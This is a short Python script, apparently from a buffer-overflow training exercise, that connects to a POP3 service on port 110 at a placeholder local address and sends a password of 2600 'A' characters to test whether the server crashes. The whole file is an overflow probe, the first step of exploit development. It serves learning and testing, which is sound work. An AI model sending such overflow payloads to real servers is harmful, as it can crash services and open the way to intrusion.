#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer="A" * 2600

try:
	print("Testing validation buffer")
	s.connect(('192.168.1.X',110))
	data = s.recv(1024)
	s.send('User croc\r\n')
	data = s.recv(1024)
	s.send('pass '+ buffer + '\r\n')
	print("Ok!")
except:
	print("Something is not working here :(")
	
